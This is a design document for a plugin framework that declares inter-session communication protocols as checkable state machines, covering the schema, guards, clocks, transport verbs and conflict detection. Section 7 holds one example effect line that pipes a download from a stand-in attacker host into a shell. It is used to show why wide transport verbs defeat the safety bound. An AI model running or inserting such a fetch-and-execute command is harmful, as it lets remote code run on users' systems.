# Design — `machines`, a framework for declared communication protocols

**Written** 2026-09-14. **Tracked in** `claude-plugins#26`. **Handoff**
`docs/handoffs/2026-09-14-signal-framework.md` on `origin/session-relay`.
**Status** design agreed; **cycle A is built, and cycle A.1 is built on top of it** — the
declaration schema and the checker, now with typed header fields, registers, guards and a
scoped, strengthened cap check, ship in `plugins/machines/`. Cycles B, C and D are not
started.
**Amended** during cycle A with the four changes agreed after this spec merged in
`PR: claude-plugins#29` and tracked in `claude-plugins#28`: they are folded
into §6, §7, §8, §9 and the new §12, and the separate changes document is gone.
**Amended again on 2026-09-15**, before cycle B is planned, with five decisions that were
held only in issues: typed header fields and guards (`claude-plugins#31`), a
monotonic clock in the envelope (`#32`), the classification of transport verbs by what
their result touches (`#34`), and the two later comments on `#28` — the limits of the
accepting-state checks, and the finding that `session-relay`'s addressing half has no
channel. They are folded into §4, §5, §6, §7, §8, §9, §10, §11, §13 and §14. **Cycle A.1
built the first of those five decisions, and the accepting-state limit's fix, into the
schema and checker; the clock and the verb classification are still unbuilt, and the
addressing question is still open for cycle D.**

**Read every "shipped" and "not built" mark in this document as load-bearing.** Cycle A
shipped a schema and a checker; cycle A.1 shipped typed header fields, registers, guards,
guard determinism, and a scoped, strengthened cap check into the same schema and checker —
**everything else this 2026-09-15 amendment adds is still unbuilt.** There is still no
clock, no verb classification and no engine in `plugins/machines/`. Two places where the
*shipped* code and this document still disagree are named where they occur — §7's effect
vocabulary and §9's verb-against-transport check — rather than being smoothed over; both
wait on cycle C. §9's cap check no longer diverges: A.1 built the stronger form this
document already called for.

---

## 1. What this is

A plugin that lets a person **declare a communication protocol as a state machine bound to
a message prefix**, checks declared protocols against each other **when one is installed**,
and carries the content of a conversation **without ever inspecting it**.

`session-relay` is then re-expressed as the first protocol declared on it.

## 2. Why, stated honestly

**The framework is a refinement, not a rescue. Do not read it as a fix for a protocol that
fails.**

Item 6 of the `session-relay` live verification ran on 2026-09-14 and passed. Prose
termination held: on a thread driven to the cap, the session recognised the cap before
acting, posted a `kind=stalemate` that refused to dress a cap as a conclusion, the
dispatched subagent performed the label swap, and the session kept the escalation rather
than delegating it. All seven verification items have now run and passed.

So the case for this framework is not that prose fails. It is:

> **Prose needs a competent reader every time. A transition does not.**

Item 6 produced two findings, and both are structural rather than semantic — which is
exactly the layer this framework covers:

1. **The stalemate comment is the eleventh and renders `11 of 10`.** The cap counts ten and
   the exit posts one more. The prose never said how to render `seq` at an exit. A declared
   bound cannot leave it unstated.
2. **"Signal the peer" has two candidate referents.** A thread's peer and the session that
   delivered the inbound signal can be different parties. In the measured run they were,
   and the session worked it out unaided and signalled both. A machine makes that a property
   of the state rather than a piece of good judgement.

Both are places where prose left something implicit and a good session covered for it.
Neither is detectable except by watching.

`claude-plugins#24` records that sessions invent coordination conventions when
nobody gives them one — six of them in one day, on 2026-09-13, none requested, every one a
good rule, and every one visible only in two transcripts the author could not read. `#24`
answers with a prohibition. This framework answers by making the invention declarable,
checkable and readable.

**One caution about the evidence.** The six conventions are verified from this repository's
own transcripts. The author also reports the same behaviour across a fleet of four sessions
in three other repositories; **nobody has read those transcripts.** It is not cited here as
established, and it must not become a requirement by being written down.

## 3. Measurements — already taken, do not re-derive

Provenance is given for every row because two of them are not this session's own work.

| Fact | Provenance |
|---|---|
| The transport wrapper is a lead line, a `<cross-session-message from="uds:…sock" from-name="…" from-mode="prompting">` element, and a trailing advisory. An `<agent-message from="<agentId>">` element nests inside **only when a subagent sent it**. | Handoff; the element, its three attributes and the advisory **re-measured directly** 2026-09-14 |
| **The lead line is not fixed.** Two deliveries between the same session pair, forty minutes apart, opened `Another Claude session sent a message:` and `Another Claude session sent a message while you were working:`. A guard anchored on it passes in testing and fails in use. | **Measured directly**, 2026-09-14, two samples. Narrows the handoff's phrase "a fixed lead line" |
| A pane is not evidence. The Claude Code TUI runs on the alternate screen, so `tmux capture-pane -S -` returns about 24 lines regardless of `history-limit`, and tool calls are never in the buffer. Only a transcript JSONL under `~/.claude/projects/` can say what a session read. | Handoff, from 2026-09-13; `#15` instances 9 and 10. **Not re-derived** |
| `ListAgents` is not available to a subagent. Confirm a peer by successful delivery instead. | Handoff. **Not re-derived** |
| A subagent's `SendMessage` goes out under the parent session's address, so a subagent driving a protocol cannot receive its own replies. | Handoff. **Not re-derived** |
| `session-relay` live verification: all seven items PASS. Evidence in `docs/superpowers/verification/2026-09-13-session-relay-live.md` on `origin/session-relay`, tip `101cc33`. | **Reported by a peer session**, with the evidence file named. Item 6's result is theirs, not this session's |
| `~/.claude/plugins/cache/{marketplace}/{plugin}/{version}/` exists and holds **every installed version** — `tone-roulette` has `0.1.0`, `0.2.0`, `0.3.0` and `0.3.1` on disk simultaneously. | **Measured directly**, 2026-09-14 |
| `~/.claude/plugins/installed_plugins.json` gives each plugin an `installPath`, a `version`, and a **`scope`** (`user`, or `project` with a `projectPath`). It is undocumented. | **Measured directly**, 2026-09-14 |
| A plain glob from outside any plugin reaches 54 `SKILL.md` files across 8 marketplaces. Cross-plugin *component path* resolution is restricted; filesystem reads by a shipped executable are not. | **Measured directly**, 2026-09-14 |
| Claude Code has **no plugin install or update hook event**. Plugins ship executables in `bin/`, PATH'd while enabled, with `$CLAUDE_PLUGIN_ROOT` and a `$CLAUDE_PLUGIN_DATA` that survives updates. | **Read from the published docs by a subagent, not independently confirmed.** Treat as a lead. The `bin/` mechanism is unexercised on this machine — no installed plugin ships one |

### The one measurement that was attempted and produced nothing

A throwaway `UserPromptSubmit` and `Notification` hook was registered in
`.claude/settings.local.json` and a peer session was asked to send a signal. **The log was
empty — and so was the positive control.** An ordinary user prompt through the same hook
logged nothing either, so the hook never loaded and the experiment measured nothing.

**This is not evidence that hooks cannot see cross-session messages.** It is the absence of
evidence, and it is recorded here so that nobody later reads the null as a result. See §11,
item 1.

## 4. The three layers

| Layer | Holds | Checked by |
|---|---|---|
| **Channel** | which channel, who holds it, who acts next, **the order of the messages and their identity** | linearity; **the envelope's clock (the envelope subsection below) — not built** |
| **Protocol** | states, legal kinds per state, which states accept, which states are terminal, an optional cap, **the typed header fields a transition may test — built in cycle A.1** | product construction, at install |
| **Content** | the message body | **nothing, deliberately** |

The third row is the point. The framework holds no content, so it can never *appear* to
verify content. A machine that looked like it checked meaning would be worse than prose,
because a reader would believe the semantic rules were verified.

**Checkable:** alternation, the legal kinds in each state, a declared cap, whether a run can
always reach somewhere it may legitimately stop, which role acts next, **and, since cycle
A.1 built §7's typed fields and guards, that a guard names a declared field, of a declared
type, under a comparison that type supports.** **Not checkable:** whether a draft states a
new fact, whether a sender set a flag honestly, **which way a guard will go** (§7 gives up that
precision deliberately, to keep the rest decidable), **whether a state marked `accepting`
really owes nothing** (§11.9 — the mark has no structural cross-check and can never have
one), and — see §7 — **whether the protocol terminates, which is not a property the
framework requires.**

### A typed header field is not content, and the boundary has to be said out loud

§7 lets a message carry named, typed fields and lets a transition test them. A reader can
reasonably ask whether that is the third row of the table being quietly erased. It is not,
and the difference is worth stating precisely rather than asserting:

> **A field is declared before it is read.** Its name and its type are in the machine, in
> writing, reviewed in the same diff as the states. The engine reads exactly the fields the
> declaration names, compares them, and looks at nothing else. **The body is still never
> read by anything.**

The distinction that matters is not *where the bytes sit* — a header and a body are both
text in the same comment — but *whether the framework decided in advance what it would look
at*. A guard on `epoch` is the machine saying "I compare two integers called `epoch`". It is
not the framework reading a message and forming a view. The failure mode §4 exists to
prevent is a reader believing meaning was verified; a declared integer comparison does not
produce that belief, and §7's disclosure rule for anything resembling consensus is there to
make sure it never starts to.

### The envelope: order belongs to the channel, not to the declaration

**Not built. Cycle B.** `claude-plugins#32`.

Every protocol message carries a **monotonic clock in its envelope**, not in the
declaration. Order is a channel-layer fact, the same kind of fact as *who holds the
channel*, so it is carried the way the channel layer carries everything: by the framework,
for every machine, with the author declaring nothing and therefore able to forget nothing.

**The author chose a Lamport clock** — each message carries `max(seen) + 1` — over a counter
per sender. The reasoning, from `#32`: a counter per sender is correct only while a protocol
strictly alternates. `session-relay` alternates strictly and two parties, so it never meets
the problem; **a machine with more than two roles meets it on its first concurrent write.** A
vector clock gives full causality and is bounded, because the role set is fixed — it is
refused anyway, because the envelope would grow with the number of roles and no protocol has
yet needed it.

**Two different orders exist, and only one of them is free.** This is `#32`'s first comment,
and the engine needs both:

| Order | Where it comes from | What it answers |
|---|---|---|
| the server's, e.g. a comment identifier | the transport, at no cost | is this message a duplicate; what is the canonical order of the trace |
| the sender's, the Lamport clock | the envelope, carried | had this sender read what I wrote before it wrote |

The first is the order of *arrival*. It does not say what each sender had read. So **a
transport must declare whether its channel provides a total order** — §8 has that part of
the contract. A GitHub issue does provide one, through comment identifiers; a
fire-and-forget transport does not, and the engine must then rebuild the order from the
envelope alone. **The machine sees neither property.**

**One thing the engine must not get wrong:** a Lamport clock is a partial order. Two
messages from different senders may carry the *same* value, and that means they are
concurrent — it is not a violation and the engine must not refuse either of them. What the
engine refuses is a message from a sender whose clock did not advance past that sender's own
last message, and a message claiming to follow something the receiver has not seen.

**This does not replace `session-relay`'s `seq=`, and cycle D must not let it try.** See
§10, which has the measurement and the argument; the two are different quantities with
different arithmetic, and reusing one name for both is the exact one-word-two-meanings
failure `session-relay`'s own design forbids.

### Accepting is not terminal, and termination is not required

An earlier statement of this design, and cycle A's first implementation of it, required every
machine to declare a `cap`, to have at least one terminal state, and to be able to reach one
from everywhere. That writes *"a protocol terminates"* into the framework as a law. **It is
not one.** Termination is a property of some protocols and not of others, and requiring it of
an author whose protocol is continuous forces them to declare a bound they do not mean — **a
declared bound nobody believes, which is the exact failure this framework exists to answer
(`claude-plugins#17`).**

The schema separates two properties instead:

- **Accepting** — nothing further is *required*. It is fine for the conversation to stop
  here, because nothing is owed.
- **Terminal** — nothing further is *possible*. No transition leaves.

They are independent, and all four combinations mean something. A conclusion is both. An idle
responder — *"it would be fine to send messages and it could also respond, but as long as
it's only answering questions, this would only be self transitions on an accepting state"* —
is accepting and not terminal. A session that has sent a message and waits for the reply —
*"this is clearly an unfinished conversation"* — is neither. And **terminal without accepting
is an error state**: an abort, a protocol violation, a peer that went away. The conversation
ended while something was still owed *and that is the point of reaching it*; the effects
notify the peers and a human picks it up. Forbidding that combination — which a first draft of
this correction did — would forbid the most useful error state a protocol can have.

What the checker protects instead is that **nobody is ever owed something forever with no
exit**: at least one state must be accepting, and every state must be able to reach an
accepting or a terminal state. Stopping badly is an exit. Stopping badly on purpose, with
effects that tell the peers, is a protocol doing its job.

## 5. Layout

```
~/.claude-machine/
  machines/<publisher>/<name>/<version>/
      machine.yaml        closed data — states (accepting, terminal, both or
                          neither), roles, kinds, transitions, an optional
                          cap, effects
      transport/          the PUBLISHER'S CODE — only the verbs it declares,
                          each verb with typed arguments, a mark saying
                          whether it reaches outside the channel, and one
                          statement of whether the channel gives a total
                          order (§8; not built)
      SKILL.md            the prose, carrying the machine in a fenced block
  registry.json           prefixes → machines, and the last conflict verdict
  installed.json          what is installed, at which ref, from where

<repo>/CLAUDE.md   ## Machines      per-repo enablement, by a human, in writing
```

Global install says a machine is *available*. The per-repo section says which machines this
repository actually *uses* — the same shape as `session-relay`'s existing `## Session relay`
declaration, which is already opt-in by a human in writing and already works.

**`~/.claude-machine/` is written only by the framework's own installer.** Nothing here
reads `installed_plugins.json` or the plugin cache. The framework owns its installation, so
the install-time check has a real trigger rather than an approximated one.

## 6. Four executables, all ours

| | Runs when | Does |
|---|---|---|
| **installer** | `/machines:install <publisher>/<repo>` | clones at a pinned ref, parses the declaration, runs the conflict check, **shows the code it is about to install and asks for consent**, writes `~/.claude-machine/` — **cycle C, not built** |
| **dispatcher** | a message arrives | strips the transport wrapper, matches the prefix, resolves machine + version — or hands back, silently — **cycle D, not built** |
| **engine** | after dispatch | folds the channel into current state; **evaluates the guards on the transitions it considers**; emits a verdict and a constraint; **gates the outbound message before it is sent** — **cycle B, not built** |
| **checker** | at install, and on demand | prefix collisions and post-prefix divergence, by product construction — **cycle A, shipped in `plugins/machines/`** |

### The engine emits a verdict, never an action

**Not built. This is cycle B's central deliverable.** The three lines marked below are what
this 2026-09-15 amendment adds to the shape agreed earlier.

```
legal?               yes | no, with the reason
holder               which role acts next
may_send             the kinds legal from here
remaining            cap headroom for this sender on this channel
terminal?            and if so, the required effects
effects.transport[]  required of installed code, under install-time consent
effects.agent[]      required of Claude, under its own tool permissions
order?               ok | duplicate | out-of-order | concurrent, from the envelope's
                     clock and, where the transport declares one, the channel's own
                     total order                                          (§4, #32)
guards[]             every guard the engine evaluated on the way to this verdict, with
                     both compared values, so a reader can see why a transition did
                     not fire                                             (§7, #31)
world_reads[]        results of world-touching verbs that were folded in, each naming
                     the message that carried it into the channel         (§8, #34)
```

Claude reads that and writes the content. **The framework never sees the content.**

**`remaining` promised a number the schema could not supply; cycle A.1 settled it.** This
line reads *"cap headroom for **this sender** on **this channel**"*; §7 declared the cap
**per bundle**, as one number for a run, and §10's item 1 recorded "a cap scoped per sender or
per channel" as a thing the schema could not express. **The verdict and the schema disagreed,
and the disagreement predated this amendment.** §11.12 carries the choice made: the schema
gained a scope, `cap: { limit, per }`, `per` one of `channel` or `role` — not `sender`, which
is rejected by name, because this declaration language names `roles` and has no field for who
sent one particular message. `role` and a genuine per-sender count coincide only as long as
exactly one participant ever holds a given role in a run, which every declaration in this
cycle assumes; a future cycle that let more than one participant share a role would need a
narrower scope of its own. Cycle B reads `m.cap_scope` to compute `remaining` — the number the
verdict promises is no longer one the schema cannot supply.

`guards[]` is not debugging output. §6's later paragraph on agent-effects argues that a
reader of a thread must be able to separate what the protocol *demanded* from what Claude
*chose*; a guard that silently refused a message is the same class of fact, and a verdict
that reported only *"not legal"* would hide it. **A guard that fires must be as readable
after the fact as an effect that fired.**

The engine also gates the *outbound* message's envelope before it is sent. That is where
determinism pays: the engine refusing to emit a message past the cap is the cap becoming
structural. Item 6 showed a competent session doing this by hand; the engine removes the
requirement that the session be competent. **The outbound envelope is also where the engine
stamps the clock** — `max(seen) + 1`, computed from the trace it has just folded, so a
sender cannot forget it and cannot choose it.

### What the engine may read, which is narrower than what the transport may do

**Not built. `claude-plugins#34`.** §8 classifies the transport's verbs; this is the
engine's side of that classification, and it is a rule about the engine, not about the
transport:

> **The engine folds channel reads. It never branches on a world read.** A result from
> outside the channel may influence the conversation only by something writing it into the
> channel as a message.

The reason is replay, and it is stronger than the content boundary. A machine's state is a
fold over the channel's trace. If a world result could reach the transition function, two
sessions folding the same trace would compute different states, because the world changed
between the two folds — **and the trace would stop being sufficient to rebuild the
conversation.** The framework has no runtime store (§14), so the trace is the only record
there is. That is the price of having no runtime, and it is why the rule is absolute rather
than a matter of taste.

### Two performers, and neither is the machine's author

An effect may name an action for the transport or an action for Claude. **The engine performs
neither. It requires, and something else performs** — and there are exactly two somethings:

| Performer | Is | Authorised by |
|---|---|---|
| the **transport** | code, shipped by the publisher | the user at install, having been told it ships code |
| **Claude** | tools | the harness's permission system |

> A machine's power is the union of what its transport offers and what Claude is permitted to
> do — **and its author controls neither. A publisher cannot grant themselves capability by
> writing a declaration.**

That is the capability model, not a limitation dressed as a virtue, and "no code in the
declaration" is what makes it hold.

**Agent-effects cost something, and the verdict is where it is paid.** A reader of a thread
who cannot separate what the protocol *demanded* from what Claude *chose* has lost the
boundary that stops the framework appearing to check meaning. So the verdict carries the two
as separate lists, and the protocol comment header records the required set. *"The machine
made me do this"* is then checkable after the fact by a person reading the issue — the only
place it can be checked.

## 7. The declaration

**Closed language.** States — each of which may be *accepting*, *terminal*, both or neither —
roles, message kinds, transitions, an optional cap, effects that **name verbs the
transport declares**, and named typed header fields with comparison guards over them — see
the guards subsection below. **No expressions, no scripts, no callbacks.**

The closure is load-bearing twice over, and this is the design's central observation:

- `#26`'s third comment requires restricting the general π-calculus — one holder at a time,
  bounded delegation, no unbounded channel creation — because the general case makes the
  useful properties **undecidable**.
- Keeping the declaration closed is also what stops the declaration itself being a
  **program**.

**The decidability limit and the trust limit are the same limit.** One restriction buys both.

**The cap** is declared per bundle, is **optional**, and **counts only the outbound messages
the machine emits** — that is, only transitions that signal. A purely local move does not
count against it, and neither does a comment the machine did not emit; `session-relay`'s "ten
comments per sender per issue" is one machine's choice of value, not the framework's rule.
This wording was ambiguous until cycle A had to implement it — see §11, item 6.

**Omitting `cap` means the protocol declares no bound**, and nothing substitutes a default:
the checker skips cap satisfiability entirely rather than measuring the machine against a
number the publisher never wrote. A continuous protocol has no bound to state, and making it
state one would produce exactly the unbelieved number this framework exists to prevent. When
a cap *is* written, it is checked against the shortest signalling run from `initial` to an
**accepting** state — not to a terminal one, because the question a budget answers is whether
it suffices to get somewhere good, and an abort is not somewhere good.

**Placement:** a fenced block inside the bundle's `SKILL.md`, beside the prose that explains
it — one file, edited in one act, reviewed in one diff. A cap that says ten in the machine
and twelve in the prose is hard to produce and obvious when produced.

### Typed header fields, and the guards that test them

**Built, in cycle A.1.** `claude-plugins#31`. This was a **schema** change, and it
landed as cycle A.1's central deliverable — see §13's A.1 proposal.

**The shipped syntax:** a field is one of exactly two types, `int` or `bool` — deliberately
no `string`, because nothing in this schema defines a string fold or a string ordering for a
guard to compare against. A register folds one declared field across the trace by one of
exactly two folds, `max` or `last`; `min` and `first` are the same shape and stay out because
no protocol in this cycle needs them, `count` stays out because it invites quorum — an
aggregation over a set of messages, which is exactly the boundary two subsections below
forbids — and `sum` stays out because it can turn a running fold of a `bool` field into an
`int`, breaking the guarantee that a register's value stays its field's declared type for its
whole life. `argmax` — remembering which message produced the maximum, not just the scalar —
is the fold most likely to be reached for next, and stays out too: it needs a second
remembered value with its own type, which is a larger feature than one more fold word, and it
should be designed on purpose rather than backed into. A guard is a structured comparison,
`{ field, op, register }`, never an expression: one declared field compared to one declared
register by one of six named operators (`eq`, `ne`, `lt`, `le`, `gt`, `ge` — never a bare
symbol, and ordering only on an `int` field). **There is deliberately no comparison against a
literal.** A guard names two remembered-or-received quantities, never a constant a publisher
could write into the declaration — `ballot > 5` has no spelling in this language, on purpose:
the value a guard compares against must be derivable from the trace and nowhere else.

Before this landed, a transition fired only on a message `kind`, never on a value.
`session-relay` already paid for that: its `blocking`, `seq` and `ref` were invisible to the
machine (§10). A pattern is the right tool for matching a prefix; **a pattern cannot order
two numbers. The schema needed integers.**

Two tests, and they buy different things:

| Test | Example | What it gives |
|---|---|---|
| equality | `epoch == current_epoch` | the machine refuses a message from a superseded round |
| order | `ballot > highest_promised` | the machine refuses a message that breaks a monotonic rule |

Equality gives round matching — a session in round 5 cannot act on a message from round 3,
which is a common defect in every protocol with epochs. Order gives Paxos's acceptor
invariant: an acceptor never accepts a ballot lower than the ballot it promised.

**The decidability trick is the load-bearing part of this change.** An integer comparison
between a message field and a remembered value makes the automaton infinite, and every check
in §9 depends on a finite one. The answer is to split where the guard is handled:

> **Abstract the guard for the static check. Evaluate it at run time.**
>
> - The checker treats a guard as **a branch with both outcomes possible**. The control
>   graph stays finite, so termination, reachability, accepting-state coverage, cap
>   satisfiability and prefix collision all stay decidable — no existing check in §9 weakens.
> - The engine evaluates the comparison when a message arrives, and refuses the message for
>   real.

**The cost is precision, not soundness.** The checker cannot prove a branch never fires, so a
guard that is always false still passes. That is a false *negative* on a dead branch; it is
not a case where the checker approves something the engine will then allow.

**Where the remembered value comes from:** nowhere new. State is a fold over the trace, so
`highest_promised` is derivable from messages already in it. The framework needs no storage,
and adding guards does not give it any.

**The boundary this does not cross, and it is the one that keeps §4's third row honest:**

> A guard tests **one message against one remembered value**. A guard does not aggregate
> over a set of messages.

Paxos's proposer rule — *choose the value from the promise with the highest ballot* — is an
aggregation, and it stays with the participant, which reports its conclusion as a `kind`. So
guards move Paxos from *"the message sequence only"* to *"the message sequence plus the
acceptor invariant"*. **They do not make the framework check Paxos.** A machine that declares
anything of that shape **must say in its own prose that it checks sequencing and the acceptor
invariant and does not check agreement** — a requirement on the declaration, not a footnote
somewhere. The reasoning is worked through in
`docs/evaluations/2026-09-14-distributed-protocols-on-machines.md`, which is reasoning from
the shipped schema and was not built or tested.

**What guards are not for: order.** The clock of §4 is envelope, not declaration, and stays
invisible to the machine. Do not let a later cycle expose it as a guardable field: duplicate
and out-of-order detection is a comparison against one remembered integer that every
protocol gets for free, and turning it into something an author declares reintroduces the
thing an author can forget.

### The effect vocabulary is the transport's, not the framework's

An earlier statement of this design fixed the vocabulary at three effects — `label.add:<name>`,
`label.remove:<name>` and `escalate` — reverse-engineered from one protocol's needs. Freezing
those into the framework is the generalising-from-one-instance failure `#26`'s body warns
about, and a machine that can only do those three is not doing work in any general sense.

**A transport declares the verb set it implements; a machine's effects name verbs and supply
arguments.** The machine holds no code — it holds a verb name. The implementation lives in the
transport, which is already publisher code with a trust decision at install, so this adds no
new trust surface: it widens §8's narrow cut from four fixed verbs to a declared set.

**A verb declares a typed argument schema, not just a name** — `label.add(name: string)`, not
bare `label.add`. The checker validates at install that every argument a machine supplies
conforms, so a machine naming a verb its transport does not offer, or supplying it with the
wrong arity or the wrong type, is an install error rather than a runtime failure halfway
through a conversation. §9 has the check.

**The cost, stated rather than hidden:** a new verb means shipping a transport, not editing a
declaration. If that inconvenience dominates in practice, that is evidence, and the line should
be revisited rather than defended.

**This section is design, and the shipped checker does not implement it. Verified 2026-09-15**
by reading `plugins/machines/lib/machines/machine.py` and `plugins/machines/SCHEMA.md`:
`check_machine` restricts every effect to the *fixed* vocabulary `label.add:<name>`,
`label.remove:<name>` and `escalate` — the exact three verbs this section calls a
generalising-from-one-instance failure — and `SCHEMA.md` documents that restriction as the
rule. The divergence is explicable: a transport declaration does not exist until cycle C, so
cycle A had nothing to validate against and hardcoded the only vocabulary it had. **It is
recorded here rather than left for a reader to trip over**, because a reader of this section
alone would believe the open vocabulary ships today. Whoever lands the transport declaration
must change `check_machine` and `SCHEMA.md` in the same act; until then the shipped checker
would reject a machine written to this section.

### The correction this forced: closure is not the whole of the safety property

An earlier statement of this design argued the safety property as *"a declaration is data,
never code."* **That is too strong, and the reasoning under it was wrong.** A declaration does
not have to embed a script to carry one. It only has to name a verb whose *argument* is one:

```yaml
effects: ["shell.run:curl evil.example.com | sh"]
```

That is data. The machine holds no code; it names a verb and supplies a string. Every check
passes, and every guarantee is gone.

**The boundary, stated correctly:**

> A machine's power is bounded by the verb set its transport declares — **and that bound is
> only as tight as the verbs are specific.** `github.label.add(name: string)` is a tight bound.
> `shell.run(cmd: string)` is no bound at all.

What follows for the transport — that a wide verb is a fact to disclose rather than a defect to
prevent — is §8.

### Scalar semantics are part of the language

Found by implementation, not by design. PyYAML resolves YAML **1.1** implicit booleans, so
`on`, `off`, `yes` and `no` become booleans in every scalar position — a mapping key, the value
under it, an entry in `kinds`, a state name, a role name, a `holder`. The corruption is
**self-consistent**: a machine declaring a kind `yes` and a transition `on: yes` compares
`True in {True}` and passes every downstream check. Nothing detects it.

**The rule:** the declaration resolves `true` and `false` (and case variants) as booleans, and
every other bare scalar as a string. It is implemented as a `SafeLoader` subclass narrowing the
implicit resolver, applied in one place. `signal: yes` is therefore a type error, not a synonym
for true, and `SCHEMA.md` says so.

**This belongs in the design and not only in the code.** The argument above is that the closed
language is safe because it cannot express computation. That is true and insufficient: a closed
language can still be **silently mis-parsed**, and then the machine that runs is not the machine
that was written. It is the `#17` shape — a rule that was correct and never fired — arriving one
layer lower, in the parser rather than in the prose. A closed language needs stated scalar
semantics, or "closed" does not mean what this section claims it means.

### Contract, not body

The declaration schema is specified in the implementation plan as **field names, types and
the failure each field prevents**. Any YAML or code that appears in the plan is labelled a
proposal, per `writing-plans-and-dispatches` rule 1.

## 8. The transport, and the narrow cut

A bundle supplies transport code, because the engine cannot know how to reach an arbitrary
channel. **The framework provides the engine; publishers are responsible for their own
machines; the user makes a trust decision at install.**

**The cut is narrow, and the transport is what draws it.** The transport **declares the verb
set it implements**, each verb with a typed argument schema (§7) — for `session-relay` that is
list the messages on a channel, append one, send a signal, resolve a peer — taking JSON and
returning JSON, holding nothing between calls. **It never sees the machine, the state, or the
cap.**

The consequence is the one that matters: a buggy or hostile transport **can misreport which
messages exist**, but it **cannot forge a transition, skip the cap, or fake a terminal
state**, because the engine is what counts and what decides. The framework's guarantees
survive bundles we did not write. That is the whole reason for having an engine.

**What the engine cannot bound is how wide a verb is.** Per §7, a machine is bounded only as
tightly as its transport's verbs are specific, and **a transport whose verbs are general is not
a defect to prevent; it is a fact to disclose.** A shell-script transport is legitimate and is
probably the first one anyone writes — `session-relay`'s own transport is `gh issue view
--comments`, `gh issue comment` and `gh label`, which is a shell script. What matters is that a
transport **names its verbs out loud**: they are in the declared set, `/machines:install` shows
them, and the user consents knowing whether the machine can be told to run arbitrary commands.

**Do not attempt to close that residue with sandboxing or a capability allowlist.** An
unenforced list that reads like a guarantee is the failure this repository documents, and
enforcing one would need a sandbox that then has to be kept correct for ever. Disclosure that
holds beats enforcement that does not. A transport doing shell execution behind a verb named
`comment.post` is simply lying; no design stops code from lying, and the install-time consent
exists for precisely that residue.

**Because a bundle ships code, `/machines:install` states that plainly and requires
consent.** It does not present a protocol as inert data.

### Verbs classify by what their result touches, not by direction

**Not built.** `claude-plugins#34`. The question that produced this was whether a
verb may be bidirectional — a database query, where the machine asks and an answer comes
back. The answer is that **every verb is already bidirectional**: a verb is a call, and a
call returns. `list the messages on a channel` is a read whose result the engine folds.

So direction is not the useful axis. **What the result touches is.**

| Kind of verb | The result goes to | Example | The rule |
|---|---|---|---|
| **channel read** | the engine | list the messages on a channel | must return the protocol headers the engine folds |
| **channel write** | nobody — an acknowledgement only | append a message, send a signal | returns success or failure, and nothing else |
| **world read** | **the participant** | query a database, fetch a page | **the engine must not branch on the result** (§6) |
| **world write** | nobody — an acknowledgement only | insert a row, add a label | returns success or failure |

A database query is a world read, and it is **permitted**. The constraint is the whole
answer:

> **A world read can change the conversation only if a message carries the result into the
> channel.** Query the database; then write a message saying what you found. The fold sees
> it.

§6 has the reasoning — replay, and the trace being the only record there is. It is a
stronger argument than the boundary between structure and meaning, and it is the argument to
cite, because it does not depend on anyone agreeing about where meaning starts.

**A verb that reaches outside the channel must be marked in the transport's declaration.** A
reader of a machine must be able to see that it queries a database, exactly as they must be
able to see that it runs a shell command — this is the same disclosure argument as the one
above about wide verbs, applied to a different axis. `/machines:install` shows the marks.

**An incoming verb is mostly sugar.** *"Wait for a message on the channel"* is the `wait`
verb and the `list` verb together; a session does not *receive* a message in this model, it
reads the trace again and folds it. `channel.receive(timeout)` is still worth naming,
because it shows intent and it unifies waiting with the timeout mechanism — but it adds no
ability, and nothing in §14 changes: **a blocking `wait` inside a publisher's transport is
not the framework growing a poller.** The framework still has no daemon and no watcher; a
transport that sleeps is publisher code, called synchronously inside a turn, under the same
install-time consent as everything else it does. Its two limits are derived in
`docs/evaluations/2026-09-14-distributed-protocols-on-machines.md` and are not measured: it
blocks the session, so the practical ceiling is seconds rather than minutes; and it fires
only while a session is awake and in that state, which detects a silent peer but is not an
unattended failure detector.

### A transport declares whether its channel gives a total order

**Not built.** `claude-plugins#32`, first comment. This is the other half of §4's
envelope, and it is part of the transport's contract because only the transport knows:

- **A GitHub issues transport declares that the channel gives a total order.** Comment
  identifiers increase, the server assigns them, and they cost nothing. The engine then
  trusts the order of the trace and uses those identifiers to find a duplicate.
- **A fire-and-forget transport declares that the channel gives none.** The engine must then
  rebuild the order from the envelope alone.

The machine sees neither the declaration nor the identifiers. This stays in the channel
layer, and the checker's only job here is to insist the statement exists.

## 9. Conflict detection

Two machines conflict when a word both accept leads to different required actions. Since the
machines are regular, this is a product construction, and the Myhill–Nerode congruence gives
the canonical minimal machine — so *"are these the same protocol"* and *"do these diverge
after a shared prefix"* are both decidable.

- **A prefix collision blocks the install.** Two machines claiming one prefix can never both
  be enabled, and finding out later is worse.
- **Post-prefix divergence blocks *enablement* of both machines in one repository**, not the
  install. Two machines may coexist globally and still be illegal together in one repo.

**Three defects in the shipped arrangement, all from `claude-plugins#28`, all
verified 2026-09-15 by reading `plugins/machines/lib/machines/registry.py`:**

1. **Prefix validation lived in `check_all`, not in `check_machine` — resolved in cycle
   A.1.** A prefix that will not compile is a property of one machine, not of a set, and
   `check_machine` is the documented answer to *"is this machine well-formed"*, so a caller
   using it directly used to get no prefix validation at all. `check_machine` now calls
   `prefix_problem` itself; see §11.7.
2. **The collision skip keys on `name` alone.** `check_all` skips a pair whose `name` matches,
   on the correct reasoning that one protocol's versions are its history and not a collision.
   But two *different publishers* who choose one name are skipped by the same line, and they
   are exactly the collision this check exists to find. **Key it on publisher and name.** This
   is the schema's missing publisher-qualified identity (§10) showing up as a live hole rather
   than a limitation.
3. **`roles` binds only names.** The values under them are unchecked.

### The other check the install runs

A machine's effects name verbs; the transport declares which verbs exist and what arguments
each takes (§7). The checker compares the two before anything runs:

```
machine `foo` requires effect `github.label.add`
transport `github-issues` declares: comment.post, label.add, label.remove
→ install error, before anything runs
```

An argument of the wrong arity or the wrong type fails the same way. A machine whose effects
its transport cannot perform is otherwise a runtime failure halfway through a conversation;
here it is caught statically, alongside a prefix collision.

**Not built, and the shipped checker does something different.** See §7: `check_machine`
hardcodes three effects today. The check described here needs a transport declaration, which
arrives in cycle C.

Two more checks belong here once the transport declaration exists, both from
`claude-plugins#34` and `#32`:

- **every verb that reaches outside the channel carries its mark**, and a machine naming a
  marked verb is reported to the user at install as reaching outside the channel;
- **the transport states whether its channel gives a total order.** Absent is not a default;
  it is a declaration that will not install, because the engine's behaviour differs between
  the two cases and guessing would pick one silently.

### The guard checks, and why they cost the checker nothing

**Built, in cycle A.1.** `claude-plugins#31`. Per §7, the checker abstracts a guard
into a branch with both outcomes possible, so nothing above this line became harder to
decide. What it gains is three static checks that would otherwise be runtime failures:

